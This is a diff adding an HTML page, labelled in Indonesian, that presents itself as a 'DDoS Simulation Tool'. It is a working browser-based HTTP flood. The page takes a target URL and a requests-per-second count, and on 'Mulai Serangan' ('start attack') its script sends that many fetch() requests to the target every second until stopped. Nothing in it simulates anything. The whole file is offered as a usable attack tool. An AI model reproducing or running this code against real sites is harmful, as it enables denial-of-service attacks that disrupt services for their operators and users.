@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>DDoS Simulation</title>
+</head>
+<body>
+    <h1>DDoS Simulation Tool</h1>
+    <label for="target">Masukkan URL Target:</label>
+    <input type="text" id="target" placeholder="http://example.com">
+    <br><br>
+    <label for="requests">Jumlah Request per Detik:</label>
+    <input type="number" id="requests" placeholder="100">
+    <br><br>
+    <button onclick="startFlood()">Mulai Serangan</button>
+    <p id="status"></p>
+
+    <script>
+        let intervalId;
+
+        function startFlood() {
+            const target = document.getElementById('target').value;
+            const requestsPerSecond = parseInt(document.getElementById('requests').value);
+
+            if (!target || isNaN(requestsPerSecond)) {
+                alert("Masukkan URL dan jumlah request yang valid.");
+                return;
+            }
+
+            document.getElementById('status').innerText = `Menyerang ${target} dengan ${requestsPerSecond} request/detik...`;
+
+            intervalId = setInterval(() => {
+                for (let i = 0; i < requestsPerSecond; i++) {
+                    fetch(target).then(() => console.log("Request sent to " + target));
+                }
+            }, 1000);
+        }
+
+        function stopFlood() {
+            clearInterval(intervalId);
+            document.getElementById('status').innerText = "Serangan dihentikan.";
+        }
+    </script>
+</body>
+</html>
